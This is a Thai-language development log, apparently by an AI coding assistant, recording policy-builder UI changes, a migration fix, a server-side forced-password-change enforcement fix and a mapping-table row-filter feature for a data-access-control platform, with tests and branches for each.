PR #13 (MySQL) merge เข้า main พร้อม migration สองไฟล์ที่เป็น V45 (`grant_purpose` ของ main + `mysql_engine` ของ branch) → Flyway ไม่ยอม start ("Found more than one migration with version 45") และ CI ของ main หลัง merge fail
- เปลี่ยนชื่อเป็น **V46** — prod มี V45 `grant_purpose` อยู่แล้ว (deploy 2026-09-30) จึงต่อด้วย V46 ได้ตรงๆ
- `INSERT … ON CONFLICT (id) DO NOTHING` — DB สำหรับ dev ที่เคยรัน MySQL เป็น V45 มีแถว `MYSQL` อยู่แล้ว · DB แบบนั้นต้องลบแถว `45 | mysql engine` ใน `flyway_schema_history` หนึ่งแถวก่อน start (ข้อมูลอื่นไม่ต้องแตะ)
- ไม่แตะ migration อื่น

## รอบก่อน — **ข้อ CZ: ปุ่ม New policy เป็นเมนูเลือกชนิด · เลือกชนิดมาแล้ว หน้าไม่ถามซ้ำ · แยกหน้า Subscription / Data Access Policy เป็นไฟล์และ route ของตัวเอง**

ผู้ใช้ขอ *"ตอนกด new policy ให้มี sub menu 1. Subscription 2. Data"* และ *"ถ้าเลือก Subscription Policy ชื่อหน้าต้อง Subscription policy และ ไม่ต้องให้เห็น option data policy"*

**หน้า Policies** (`PolicyListPage`) — ปุ่ม **New policy** เปิด dropdown แบบเดียวกับเมนู Create บน header: *Subscription policy* → `/policies/new?kind=SUBSCRIPTION` · *Data policy* → `/policies/new?kind=DATA`

**เมื่อมี `?kind=` มาแล้ว** (`kindChosen` ใน `PolicyBuilderPage` ส่งต่อให้ `PolicyTargetPicker`)
- หัวหน้า *Where it runs* และหัวฟอร์ม = **Subscription policy** / **Data policy** (แทน *New policy*)
- ซ่อน section *What kind of policy* ในหน้า Where it runs และช่อง **Kind** ในฟอร์ม (เฉพาะ policy ใหม่ · แก้ policy เดิมยังเห็นช่อง Kind เหมือนเดิม)
- เข้าแบบไม่มี kind (ปุ่ม New policy ในหน้า Home · draft จาก access request / NokRak) → ยังถามชนิดเหมือนเดิม

**แยกหน้าจอ Subscription / Data Access Policy แล้ว** (ผู้ใช้สั่ง *"แยกให้เลย ให้พร้อมทำงานสองคน สองเครื่องได้"*)
- route ใหม่: `/policies/new/subscription` → `subscription/SubscriptionPolicyPage.tsx` · `/policies/new/data` → `data-access/DataAccessPolicyPage.tsx`
- step ที่เป็นของแต่ละชนิด (step 4 เป็นต้นไป) ย้ายออกจาก `PolicyBuilderPage.tsx` ไปอยู่ในไฟล์ของชนิดนั้น:
  - `subscription/subscriptionPolicy.tsx` — Effect + SubjectBuilder · ชื่อหน้า · icon · ค่าเริ่มต้น
  - `data-access/dataAccessPolicy.tsx` — SubjectBuilder (optional) + DataPolicyBuilder · ชื่อหน้า · icon · ค่าเริ่มต้น (ORG)
  - `DataPolicyBuilder.tsx` + test ย้ายไป `data-access/` (git mv)
- `PolicyBuilderPage.tsx` = ส่วนที่ใช้ร่วม (step 1–3, save, lifecycle, NokRak, rail, dialog) · รับ `kind` เป็น prop (`PolicyKind` ใน `policyKind.ts`) · หน้าแก้ policy เดิม (`/policies/:id/edit`) เลือก step ตาม `policyType` ของเอกสาร
- `/policies/new` (ไม่มี kind — ปุ่มหน้า Home, draft จาก access request / NokRak) ยังถามชนิดเหมือนเดิม · เลือกแล้วไปหน้าของชนิดนั้น · ลิงก์เก่า `?kind=` redirect ไปหน้าใหม่ (เก็บ source/mode ไว้)
- เมนู New policy / Create / ปุ่มกลับของ Databricks ใช้ `NEW_POLICY_PATH`

**การแบ่งงาน (branch)** — หลังข้อนี้เข้า main:
- **Subscription Policy** — ผู้ใช้ · branch `sakan/subscription-policy` · แก้เฉพาะ `pages/policies/subscription/`
- **Data Access Policy** — เพื่อน · branch `<github-user ของเพื่อน>/data-access-policy` · แก้เฉพาะ `pages/policies/data-access/`
- ไฟล์ร่วม (`PolicyBuilderPage.tsx`, `policyKind.ts`, `SubjectBuilder.tsx`, `SelectorBuilder.tsx`, `controls.tsx`, `App.tsx`) — ถ้าต้องแก้ ให้ตกลงกันก่อน แล้วเข้า main เป็น PR เล็ก ๆ แยก ให้อีกฝั่ง pull

**test** — `PolicyListPage.test` +1 (เมนูไปหน้าของ kind) · `PolicyBuilderPage.test` +5 (kind มาแล้ว: หัวหน้า + ไม่มีตัวเลือก Data + ไม่มีช่อง Kind · หน้า Data มี step "What they see" · ลิงก์ `?kind=` เก่า redirect · เลือกชนิดบน `/policies/new` แล้วไปหน้าของชนิดนั้น · ไม่มี kind: ยังถาม) · jest ทั้งชุด 86 suites / 887 ผ่าน · type-check ผ่าน · lint ของไฟล์ที่แก้ผ่าน (error ที่เหลือเป็นของ `shot-*.mjs` ในเครื่อง ไม่ได้ commit)
- ไม่มี migration · ไม่แตะ backend
- docs: `user-guide.md` (Writing a policy)

**PR** — branch `sakan/policy-kind-menu` · ผู้ใช้สั่ง *"จะ push ขึ้น main แล้วแจ้งเพื่อนให้ Pull"*

## รอบก่อน — **ข้อ CY: *Where it runs* เลือกยี่ห้อ database ก่อน แล้วค่อยเลือก connection · โลโก้จริง · การ์ด Databricks ไปหน้าแยก**

ผู้ใช้ขอ *"Which connection เปลี่ยนเป็นชื่อ ชื่อยี่ห้อสิ แล้วอาจจะค่อยสามารถเลือก Connection ได้อีกที"* · *"ออกแบบดีๆให้หน่อย"* · *"ต้องใส่ logo จริง ของยี่ห้อนั้นๆด้วยสิ"* และ *"ให้เลือกเพิ่ม Databrick ด้วยนะ ทำเป็นหน้าไว้ก่อน … ทำหน้ากากไว้ให้เขาเชื่อม"*

**`PolicyTargetPicker`** — section *Which connection* → **Which database**
- การ์ด: Every connection · หนึ่งใบต่อ engine จาก `/v1/sources/engines` (ตามลำดับของ server · engine ที่ยังไม่มี connection แสดงแต่กดไม่ได้ *No connection registered yet*) · engine ที่ server ไม่รู้จักแต่มี source อยู่ได้การ์ดของตัวเอง (`engineGroups()`)
- การ์ดยี่ห้อบอก จำนวน connection · จำนวน table · โหมดที่ใช้ (badge ไม่ซ้ำ)
- กดยี่ห้อ → แผง **Which &lt;ยี่ห้อ&gt; connection** ด้านล่าง (การ์ด connection เดิม: version · tables · โหมด · Disabled) · มีช่องค้นหาเมื่อเกิน 6 ตัว · ยี่ห้อที่มี connection เดียวเลือกให้เลย · เปลี่ยนยี่ห้อแล้ว connection เดิมที่ไม่ใช่ยี่ห้อนั้นถูกล้าง
- ปุ่ม *Change* จากฟอร์มกลับมาแล้วเปิดยี่ห้อของ connection เดิมให้
- แถบล่าง: *on demo-pg (PostgreSQL)*
- ⚠️ เลือกยี่ห้อ ≠ policy คลุมทุก connection ของยี่ห้อนั้น — selector ไม่มี facet engine (มีแค่ `service`) · ถ้าจะเอาแบบนั้นต้องเพิ่ม facet ใหม่ · ตอนนี้ใช้ Every connection + step 3

**โลโก้** — `EngineMark.tsx` + `src/assets/engines/*.svg` (มี README บอกที่มา/license/หมายเหตุเครื่องหมายการค้า)
- PostgreSQL · SQL Server · MySQL จาก devicon 2.17.0 (MIT) · Databricks จาก Simple Icons 16.33.0 (CC0, เติมสี `#FF3621`)
- engine ที่ไม่มีไฟล์โลโก้ → ตัวอักษร 2 ตัวบนกล่องเทา

**Databricks** — การ์ดคงที่ในหน้า (backend ยังไม่มี engine นี้) → `/policies/new/databricks?kind=…` (`pages/policies/databricks/DatabricksPolicyPage.tsx`)
- เป็นหน้ากากรอ builder ที่อีกคนกำลังทำ · ไม่บันทึกอะไร · เชื่อมโดยวาง builder แทน `<BuilderPending />` · รับ `kind` ทาง query string

**test** — `PolicyBuilderPage.test` 32 ผ่าน (+3: ยี่ห้อก่อนแล้วค่อย connection · ยี่ห้อที่ไม่มี connection กดไม่ได้ · Databricks ไปหน้าของตัวเอง) · jest ทั้งชุด 86 suites / 881 ผ่าน · type-check ผ่าน · lint มีแต่ของเดิม · ลองจริงใน local (:8150) ไม่มี page error
- ไม่มี migration · ไม่แตะ backend
- docs: `user-guide.md` (Writing a policy → Which database) · DESIGN M4

**PR** — branch `sakan/connection-by-engine` · ผู้ใช้สั่ง *"เอาขึ้น main และ Prod เลย"*

## รอบก่อนหน้า — **ข้อ CX: เพิ่ม local account จากหน้า People · server บังคับเปลี่ยนรหัสผ่านจริง · empty state ของหน้า Policies ตาม filter**

ผู้ใช้ขอ *"add local account -> เอาใส่ใน People & attributes ด้วย เวลาจะสร้าง local user"* และ *"แก้ไข Bug ด้วยนะ"*

**หน้า People** (`PrincipalsPage`) — ปุ่ม **Add local account** (เฉพาะ `PLATFORM_ADMIN`) ข้างลิงก์ Settings → Roles · เปิดฟอร์มเดียวกับ Settings → Roles
- ย้ายฟอร์มออกมาเป็น `settings/LocalAccountForm.tsx` และ `ROLES` เป็น `settings/appRoles.ts` · `AppRolesPage` ใช้ของเดียวกัน (ไม่มีพฤติกรรมเปลี่ยน)
- สร้างเสร็จ → ข้อความเขียวพร้อมลิงก์ `/principals/{id}` + invalidate `['principals']` ให้ list โหลดใหม่

**บั๊ก 1 (security) — `must_change` บังคับแค่ใน UI** · token ของคนที่ admin ตั้งรหัสให้ยังเรียก API อื่นได้ครบ (ข้าม UI ด้วย curl ได้)
- `JwtService`: claim `pwc=true` เฉพาะตอน login ด้วยรหัสที่ต้องเปลี่ยน · `verifySession` คืน `Session(user, passwordChangePending)` · `verify` เดิมยังใช้ได้
- `AuthFilter(tokens, mustChangePassword)`: token ที่มี `pwc` + endpoint ไม่มี `@PasswordChangeExempt` (ใหม่) + DB ยังบอก `must_change` → **403** *choose a new password before using the rest of the API* · admin ก็โดน
- เช็ค DB (`LocalIdentityDao.mustChangePassword`) เฉพาะ token ที่มี `pwc` → token ปกติไม่เสีย query เพิ่ม · เปลี่ยนรหัสแล้ว token เดิมใช้ต่อได้ทันที ไม่ต้อง login ใหม่
- exempt: `GET /v1/auth/me` และ `POST /v1/auth/password` เท่านั้น
- ⚠️ script ที่ login ด้วย bootstrap admin (`scripts/seed-example-policies.mjs`, `scripts/demo-time-window.py`) จะได้ 403 ถ้า admin คนนั้นยังไม่เคยเปลี่ยนรหัส → เปลี่ยนรหัสใน Profile ก่อน

**บั๊ก 2 — หน้า Policies ว่างเพราะ filter แต่บอกว่า "No policies yet … deny by default"** ทำให้เข้าใจว่า platform ไม่มี policy
- มี search → *No policy matches "…"* · มี filter/tab → *No policy matches these filters* + บอกว่า policy ที่ถูกซ่อนยังมีผล · ไม่มีอะไรเลยจริงๆ → ข้อความ deny-by-default เดิม

**ไม่ใช่บั๊ก** — `GET /v1/policies` อ่านได้ทุกคนที่ login · ตั้งใจ (FR-3.1.5: ทุกคนต้องเห็นว่า policy ไหนมีผลกับตารางของตัวเอง) · ไม่ได้แก้

**test** — `AuthFilterTest` ใหม่ 7 · `JwtServiceTest` +1 · backend unit 864 ผ่าน · jest 86 suites / 878 ผ่าน (`PrincipalsPage.test` +2 · `PolicyListPage.test` +1 และขยาย 2) · type-check ผ่าน · lint มีแต่ของเดิม
- live local (:8150): account ใหม่ได้ `pwc` → 403 ที่ `/v1/policies/count` และ `/v1/catalog/assets` · 200 ที่ `/v1/auth/me` · เปลี่ยนรหัสแล้ว token เดิมใช้ได้ · login รอบถัดไปไม่มี `pwc` · account ที่ไม่ต้องเปลี่ยนไม่กระทบ (11/11)
- ไม่มี migration
- docs: `user-guide.md` (Signing in · The policy list · People) · DESIGN M2

**PR** — branch `sakan/people-add-account` · ผู้ใช้สั่ง *"เอาขึ้น main + prod ทั้งหมด"* → merge แล้ว deploy prod พร้อมข้อ CU–CW

## รอบก่อนหน้า — **ข้อ CW: หน้า Policies บอกว่าแต่ละ policy รันที่ connection ไหน ด้วยโหมดอะไร และ filter ได้**

ผู้ใช้ขอ *"หน้า ภาพรวม policy ต่างๆ อาจจะต้องแสดงว่า policy เป็น Type ไหน สำหรับ source ไหน Every หรือ connection ไหน ต้อง Filter ได้"*

**policy ไม่ได้เก็บ connection หรือโหมด** — เลยอ่านจากตัว policy ทุกครั้ง (`PolicyReach` ใหม่ ใน `com.mfec.dac.policy`):
- anchor ระดับ SERVICE ลงไป → segment แรกของ `scopeFqn` คือ service
- selector: `service eq x` (ที่หน้า picker เขียน) · `in` หลายตัว · database/schema/table ที่เป็น FQN เต็ม (อย่างน้อย 2 segment) → confine · `and` = intersect · `or` confine ก็ต่อเมื่อทุก branch confine (union) · `not` / `ne` / ชื่อ leaf เปล่า (`schema eq 'dbo'` ซึ่งมีได้ทุก service) → **Every connection**
- anchor ∩ selector ว่าง = policy ที่ครอบอะไรไม่ได้ → แสดง *No connection*
- หลักคือ **บอกแคบก็ต่อเมื่อแน่ใจ** — ถ้าบอกว่าอยู่ connection เดียวแต่จริงๆ ไปถึงที่อื่นด้วย คนอ่านจะเข้าใจว่า policy แคบกว่าความจริง
- service → source ใช้ `SourceCatalogImporter.serviceOf` (เปลี่ยนเป็น `public static`) เทียบแบบไม่สนตัวพิมพ์ · service ที่ไม่มี source → `sourceId`/`engine`/`mode` เป็น null (*Not a registered connection*)
- โหมดคือ `defaultEnforcementMode` ของ source **ณ ตอนนี้**

**API** — `GET /v1/policies` คืน `ListedPolicy` = field ของ `StoredPolicy` เดิม (ผ่าน `@JsonUnwrapped` ผู้เรียกเดิมไม่ต้องแก้) + `reach: {everyConnection, connections:[{service, sourceId, name, engine, mode}]}` · ไม่มี host/credential ออกไป
- query param ใหม่ทั้ง list และ `/count`: `source=<uuid>` (policy ที่ confine อยู่ที่ source นั้น) · `source=any` (เฉพาะ policy ที่เป็น every connection) · `mode=PROXY|SECURE_VIEW|NATIVE_CONFIG|NONE` (policy ที่ confine อยู่บน connection ที่ตั้งโหมดนั้นตอนนี้ — every connection **ไม่นับ** เพราะโหมดขึ้นกับ connection ให้ตรงกับที่คอลัมน์แสดง) · uuid/โหมดผิด → 400
- ถ้ามี source/mode → `PolicyStore.listAll` (filter เดิมใน SQL) แล้วกรองใน Java ค่อย skip/limit · count นับจากชุดเดียวกัน pager เลยไม่เจอหน้าว่าง · ⚠️ ถ้า policy เกิน ~10k ควรย้ายไปเป็น column ที่ derive ไว้ตอน save
- `DacApplication`: ย้าย `DataSourceStore sources` ขึ้นมาก่อน register `PolicyResource` แล้วส่ง `new PolicyReach(sources::list)` · constructor 5 arg เดิมยังใช้ได้ (`new PolicyReach(List::of)` = ทุกอันเป็น service ที่ไม่ได้ลงทะเบียน)

**หน้า** `PolicyListPage` — คอลัมน์ **Connection** ใหม่ (ชื่อ connection + badge โหมด · *Every connection / Each in its own mode* · *Not a registered connection* · *No connection*) · badge *Subscription* / *Data* ข้างชื่อ · filter **Connection** (Any · Every connection · ทุก source จาก `fetchSources`) และ **Enforcement mode** อยู่ใน URL (`?source=&mode=`) · query key รวม source/mode · Clear ล้างด้วย (เหลือแค่ tab)

**test** — `PolicyReachTest` 13 (confine 7 · every 6 รวม contradiction) · `PolicyListReachTest` 6 (ไม่มี filter ไม่เรียก `listAll` · ต่อ connection + paging · `any` · โหมด · 400 · JSON แบน + มี `reach` ไม่มี `policy`/host) · backend unit ผ่าน · jest 86 suites / 875 ผ่าน (+3 ใน `PolicyListPage.test`) · type-check สะอาด · lint ไม่มีในไฟล์ที่แก้
- docs: `user-guide.md` (section ใหม่ *The policy list*) · DESIGN M4

**PR** — branch `sakan/policy-list-target` ซ้อนบน `sakan/scope-levels-preview` (PR #8) · ต้อง retarget เป็น main ก่อน merge PR #8 · merge แล้ว (`c4787bf`) · ขึ้น prod พร้อมข้อ CX

## รอบก่อนหน้า — **ข้อ CV: step 3 แสดง table ที่ policy จะครอบ · subscription เลือกได้ทุกระดับ · connection เดียวเลือกได้แค่โหมดของมัน**

ผู้ใช้ขอ *"ตอนที่เลือก Which assets it covers ต้องแสดง Table หรือ Asset ที่อยู่ใน Scope ให้เห็นด้วยว่า มีอันไหนโดนบ้าง ออกแบบให้สวยหน่อย"* · *"Where it sits เอา Level อื่นของ table กลับมา … เพราะเรามีไป Filter ข้อ 3 Which assets it covers อยู่แล้วหนิ"* · และจาก screenshot: *"ถ้า Source ไม่รองรับ ทำไมมีให้เลือกอะ มันต้องเทาไปไม่ใช่หรอ"* (connection ตั้งเป็น Query proxy แต่ Secure view ยังกดได้)

**Preview ของ step 3** — `POST /v1/policies/scope-preview?limit=` (`PolicyResource.scopePreview`) รับ draft ที่ยังไม่ save แล้วเรียก `PolicyBindingMaterializer.preview(policy, limit)` ซึ่งใช้ `loader.forEachInScope` + `SelectorMatcher.matches` ตัวเดียวกับตอน save (ผลต้องไม่ต่างจาก binding จริง) · **ไม่เขียนอะไรลง DB** · ตอบแค่ชื่อ: `scanned` · `matched` (ไม่ถูก cap) · `tables[{fqn, columns}]` (cap 1..500) · `truncated` · `columns` = column ที่ column rule ของ data policy เลือก · selector ว่างได้ 0 เสมอ (เหมือน matcher)
- `ScopePreview.tsx` ใหม่ ใต้ `SelectorBuilder` ใน step 3: หัว *What this covers right now* + บอก scope (ทั้ง estate / *Inside X only*) · 3 stat (Tables covered · Tables in scope · Columns picked หรือ Share of scope) + progress bar · จัดกลุ่มตาม schema · ชื่อ table เป็นลิงก์ไป catalog (tab ใหม่) · data policy แสดง badge column ต่อ table · ช่อง filter เมื่อรายการยาว · เกิน 200 บอก *Showing the first 200 of N*
- debounce 400ms ที่ตัว draft (`useSettled`) แล้ว key ด้วย `scopeKey` (type · level · anchor · selector · column rules) · selector ที่ยังไม่มีค่า (`hasCondition`) ไม่ยิง API · 🐛 ที่เจอตอนเทสต์: รอบแรกยิงด้วย selector `{}` ของ EMPTY ก่อน draft จาก NokRak จะมาถึง และ queryFn ส่ง draft สด ไม่ใช่ตัวที่ settle → แก้ให้ส่งตัวที่ settle

**ทุกระดับกลับมาให้ subscription** — ลบ `SUBSCRIPTION_LEVELS` / `levelOptions()` · Level ใช้ `SCOPE_LEVELS` ทั้ง 7 ชั้นทั้งสอง kind · anchor แค่ทำให้แคบลง ไม่เคยทำให้กว้างขึ้น (step 3 เลือกต่อจากใต้ anchor) · placeholder ของ Anchor ตามชั้น (`ANCHOR_EXAMPLES`) + hint อธิบาย · เปลี่ยน kind ไม่รีเซ็ต level อีกแล้ว

**Connection เดียว → เลือกได้แค่โหมดของมัน** (`PolicyTargetPicker.lockedMode`) — `defaultEnforcementMode` ของ source (ไม่นับ `NONE`) คือโหมดเดียวที่กดได้ · กด connection = เลือกโหมดนั้นให้เลย · โหมดอื่นเทา + badge *Not set on this connection* + ข้อความ `mode-locked` ว่าต้องให้ admin เปลี่ยนที่ Sources · *Every connection* เลือกได้ทั้ง 3 · `ready` ต้องตรงกับโหมดที่ล็อก · เหตุผล: โหมดไม่ถูกเก็บใน policy และ policy ถูก enforce ด้วยโหมดของ source เสมอ การให้เลือกโหมดอื่นเท่ากับให้เขียน policy ที่ check กับโหมดที่ไม่มีวันถูกใช้

**test** — `PolicyBindingMaterializerIT` 15/15 บน Postgres จริง (+5 ใน `// preview`: ผลตรงกับที่ save จะ bind และไม่เขียน `policy_binding` · อยู่ใน scope · ไม่มี selector = 0 · column ที่ column rule เลือก · truncated ที่ limit) · backend unit ผ่าน · jest 86 suites / 872 ผ่าน (`ScopePreview.test` 7 ใหม่ · `PolicyBuilderPage.test`: connection เดียวโหมดอื่นกดไม่ได้ · Every connection มีครบ 3 · step 3 แสดง table ของ draft จาก NokRak ก่อน save · subscription มีครบ 7 ระดับ + placeholder/hint) · type-check ผ่าน · lint: error เฉพาะ `shot-*.mjs` (ของ local)
- docs: `user-guide.md` (ระดับของ policy + panel *What this covers right now* · หน้า where it runs ล็อกโหมด) · DESIGN M4

**prod** — ข้อ CU (`4db034d`) deploy แล้ว 2026-09-30 (ไม่มี migration · dist ใหม่มีหน้า picker) · smoke ผ่าน API ยังค้าง (tunnel ไม่ได้รับอนุญาต) · ข้อ CV ยังไม่ขึ้น prod

**ยังไม่ทำ / ข้อควรรู้**
- ผู้ใช้ขอแล้ว ทำต่อ: หน้ารายการ policy แสดง kind · connection (Every / ชื่อ) · โหมด และ filter ได้ (ต้องทำฝั่ง server เพราะรายการแบ่งหน้า)
- draft จาก NokRak / access request ยังข้ามหน้า picker (connection = Every · ไม่มีโหมด) — เสนอให้มีตัวเลือก *where it runs* ในฟอร์ม ยังไม่ได้รับคำตอบ
- connection ที่ตั้ง Query proxy บน engine ที่ไม่มี proxy capabilities: โหมดเดียวที่ล็อกไว้กดไม่ได้ → เลือก connection นั้นไม่ได้ (ถือว่า config ของ source ผิด ต้องแก้ที่ Sources)
- DBeaver / pgwire (M29 · FR-19)

## รอบก่อนหน้า — **ข้อ CU: หน้า *Where it runs* ก่อนฟอร์ม policy · `LOOKUP` เลือก column ด้วย tag · Credits**

ผู้ใช้ขอ *"หน้าที่ให้เลือก Connection, Query API, Native config, Secure view ที่จะสร้าง Policy ทำให้สวยๆหน่อยนะ ก่อนเข้าหน้า Configure policy"* · ก่อนหน้านั้นถามว่าควรแยกไหมว่า policy นี้สำหรับโหมดไหนของ connection อะไร โดยให้เลือก connection ก่อนแล้วเลือกโหมดที่ connection นั้นรองรับ · และตอบ *"yes"* ให้แก้ `ConditionValues` เพื่อให้ `LOOKUP` เลือก column ด้วย tag ได้ (ค้างจากข้อ CT) · และขอเพิ่มชื่อผู้ร่วมพัฒนาใน *Designed and built*

**หน้า *Where it runs* (`PolicyTargetPicker.tsx` ใหม่)** — `/policies/new` ที่ยังไม่มี `mode` ใน URL เปิดหน้านี้ก่อนฟอร์ม
- 3 ส่วนเป็น card กดเลือก (`<button aria-pressed>`): **What kind of policy** (Subscription / Data) · **Which connection** (*Every connection* + card ต่อ source: engine + version · จำนวน table · badge โหมดปัจจุบัน · Disabled) · **How it will be enforced** (Query API / Secure view / Native source config · badge *In use on this connection* · Native = *Checked, not applied yet* เพราะ M6 on hold · Query API ปิดถ้า engine ไม่มี `proxyCapabilities`)
- แถบล่าง sticky สรุปคำตอบ + ปุ่ม *Configure the policy* (ปิดจนกว่าจะเลือก connection และโหมด) → เขียน `?kind=&source=<id|any>&mode=` ลง URL (reload / Back กลับมาที่คำตอบเดิม)
- เลือก connection → selector ของ step 3 เริ่มที่ `service eq <omServiceFqn ?? name>` (ชื่อ service แบบเดียวกับ `SourceCatalogImporter.serviceOf`) · ถ้าผู้เขียนแก้ selector เองแล้ว เปลี่ยน connection จะไม่ทับ · *Every connection* ล้างเฉพาะ selector ที่มาจากการเลือก connection
- **โหมดไม่ถูกเก็บลง policy** (schema `additionalProperties: false` และตั้งใจแบบนั้น) — policy ถูก enforce ด้วยโหมดของ source เสมอ (FR-6.0a) · ถ้าเก็บโหมดไว้ใน policy วันที่มีคนเปลี่ยนโหมดของ source policy จะหยุดทำงานเงียบๆ = รั่ว · โหมดที่เลือกใช้แค่ขับ capability matrix ใน rail (block ที่เลือกมี badge *Chosen*) · เลือกโหมดไม่ตรงกับ source → ขึ้นข้อความว่า source ยังใช้โหมดเดิม ต้องให้ admin เปลี่ยนที่ Sources
- ฟอร์ม: หัวมี chip connection · engine และโหมด + ปุ่ม **Change** (ลบ `mode` ออกจาก URL กลับไปหน้าเลือก โดยคำตอบเดิมยังเลือกอยู่) · rail แสดง engine เป็น badge แทน Select เมื่อเลือก connection
- policy ที่มาแบบเขียนไว้แล้ว (suggest จาก access request ผ่าน location state · NokRak ใน chat/dock) ข้ามหน้านี้ — มี flag `tookDraft` เพราะ `takePolicy()` ล้าง store ก่อน render รอบถัดไป (ไม่มี flag ฟอร์มที่ NokRak เติมจะถูกหน้าเลือกบัง — บั๊กที่เจอระหว่างทดสอบ มี test แล้ว)

**`LOOKUP` เลือก column ด้วย tag** — `ConditionValues.rowFilterColumn` รับ `columns` selector บน `LOOKUP` ด้วย (engine + `LookupCheck` รองรับตั้งแต่ข้อ CT) · `DataPolicyBuilder` แสดง *Pick the column by* (Column named / Column tagged) ใน kind mapping เหมือน kind อื่น · เปลี่ยนมา LOOKUP ไม่ทิ้ง tag ที่เลือกไว้แล้ว · ไม่มี column ที่ติด tag → 0 แถว

**Credits** — Settings → Credits และ README เพิ่มชื่อผู้ร่วมพัฒนาใน *Designed and built* (ผู้ใช้ขอ · repo public จึงเป็นข้อมูลสาธารณะ)

**test** — backend unit 837 ผ่าน (`ConditionValuesTest` +2) · `LookupRowFilterIT` 18/18 บน Postgres จริง (+3: เลือกด้วย tag ทั้ง join / read-first · tag ที่ไม่มี column ติด = 0 แถวทั้งสองโหมด · save ด้วย tag ผ่าน ไม่มีทั้งชื่อและ tag ไม่ผ่าน) · frontend jest 85 suites / 862 ผ่าน (`PolicyBuilderPage.test` +9 ใน *where a new policy runs*: ต้องเลือกก่อน · selector = service ของ source และไม่มีโหมดใน document · source ที่ link OM ใช้ omServiceFqn · Change กลับไปพร้อมคำตอบเดิม · เตือนโหมดไม่ตรง · Native not applied yet · Query API ปิดบน engine ที่ไม่รองรับ · NokRak draft ข้ามหน้าเลือก · data policy เริ่มที่ Organisation · `DataPolicyBuilder.test` +1) · type-check ผ่าน · lint: error เฉพาะไฟล์ `shot-*.mjs` ที่ gitignore (ของ local ไม่ได้ commit)
- docs: `user-guide.md` (*Writing a policy* — หน้า where it runs · *Rows given by a mapping table* — Column tagged) · `policy-spec.md` (LOOKUP ใช้ `columns` ได้) · DESIGN FR-4.1 + M4

**ยังไม่ทำ / ข้อควรรู้**
- ผู้ใช้ขอไว้แล้วยังไม่ทำ: (b) step 3 *Which assets it covers* แสดงรายการ table ที่เข้า scope แบบสวยๆ · (c) *Where it sits* เอา level อื่นกลับมา (ตอนนี้ subscription มี ORG / TABLE) · DBeaver / pgwire (M29 · FR-19)
- Edit policy เดิมไม่ผ่านหน้าเลือก (ไม่มีโหมดใน document ให้ย้อนอ่าน)

## รอบก่อนหน้า — **ข้อ CT: Row filter อ่านค่าที่เห็นได้จาก mapping table (`LOOKUP` · ทั้ง SUBQUERY และ READ_VALUES · FR-4.1)**

ผู้ใช้ขอ *"สิทธิที่ต้องไปตรวจสอบ Table เพิ่ม … อาจจะ Join ได้ด้วย"* พร้อมตัวอย่าง: ตาราง A มี division / value (A 123 · B 456) · คนอยู่ department AA · master table บอกว่า AA อยู่ division A → เห็นแค่ A 123 · สั่ง *"เอาทั้ง 2 แบบ เลย ทำให้ดีนะ อย่าให้มี Bug"* · ก่อนหน้านี้ row filter เอาค่าจาก attribute ของคนได้อย่างเดียว

**spec**
- `dataPolicy.json` — kind ใหม่ `LOOKUP` + `rowFilter.lookup`: `table` (service.database.schema.table) · `keys[]` ≥ 1 (`column` ของ mapping × `userAttribute` ของคน · หลาย key = AND) · `valueColumn` · `mode` = `SUBQUERY` (ค่าเริ่มต้น) / `READ_VALUES`
- `policyDecision.json` — `ResolvedRowPredicate.lookup` (`ResolvedLookup`: table · keys พร้อม `values` ของคนนั้น · valueColumn · mode · `schemaName` / `tableName` ที่ proxy เติมตอน bind)

**engine** — `PolicyEngine` resolve ค่า key ของคน · ไม่มี attribute ตัวไหน หรือ lookup ไม่ครบ → `ALWAYS_FALSE` พร้อมเหตุผล (fail-closed) · column เลือกผ่าน `filteredColumns` เหมือน kind อื่น แต่ละ predicate ได้ lookup ของตัวเอง (ไม่แชร์ เพราะ proxy bind แยกต่อตาราง)

**proxy (`QueryService.govern` → `LookupBinder.bind` บน deep copy ของ decision — decision ที่ cache ไว้ไม่ถูกแก้)**
- ทั้งสองโหมด: mapping ต้องอยู่ใน catalog และยังอยู่ที่ source · ชื่อ column ถูกเทียบกับ catalog (ตัวพิมพ์ตาม catalog · ชื่อซ้ำ → ปฏิเสธ) · อะไรก็ตามที่ bind ไม่ได้ → **ปฏิเสธ query** (ไม่ใช่ 0 แถว — 0 แถวจะซ่อนความผิดพลาดจากคนที่รายงานได้)
- `SUBQUERY` — `DecisionSql` render `column IN (SELECT value FROM schema.table WHERE key IN (...) AND ...)` · mapping ต้องอยู่ source + database เดียวกับตารางที่กรอง ไม่งั้นปฏิเสธพร้อมบอกให้ใช้ READ_VALUES · **ไม่ใช้ result cache** (mapping เปลี่ยนได้ระหว่าง query เดียวกันสองครั้ง)
- `READ_VALUES` — อ่าน `SELECT DISTINCT` บน source ของ mapping ก่อน (ใช้ admission slot · timeout 15 วิ · cost ceiling เดียวกับ query) แล้วเป็น `IN` list ธรรมดา · ข้าม source ได้ · > 1,000 ค่า → ปฏิเสธ (ไม่ตัด) · type ที่ไม่ใช่ text / integer / numeric / uuid / date → ปฏิเสธ · char ที่ถูก pad ถูก trim · ไม่ได้ค่าเลย → `ALWAYS_FALSE` · error ของ source ลง log เท่านั้น (ข้อความอาจเอ่ยชื่อที่คนถามไม่ควรรู้) · เรียงค่าให้คงที่เพื่อให้ cache เจอซ้ำได้
- **ค่าที่อ่านมาไม่ถูกเก็บ ไม่ถูก describe ไม่ถึง LLM** · policy ของ mapping table เองไม่ใช้กับการอ่านนี้ (เป็น control table — ARAK อ่าน ไม่ใช่คนถาม)

**ที่อื่น** — `ViewCompiler`: LOOKUP → view คืน 0 แถว + `unenforceable` แนะนำ PROXY · `RowEntitlementMaintainer` ข้าม LOOKUP · `AccessReview` / `ImpactAnalysis` บอกว่าแถวมาจาก mapping ไหน (key ของ impact รวม table / mode / key → mapping เปลี่ยน = ผลเปลี่ยน) · `LookupCheck` ตอน save: ต้องมี column · mapping table 4 ส่วน · valueColumn · key ครบ · อยู่ใน catalog · มี column ตามที่อ้าง (ไม่ตรวจว่าอยู่ source เดียวกัน เพราะ policy เดียวครอบหลาย source ได้ — proxy บอกต่อตาราง)

**frontend**
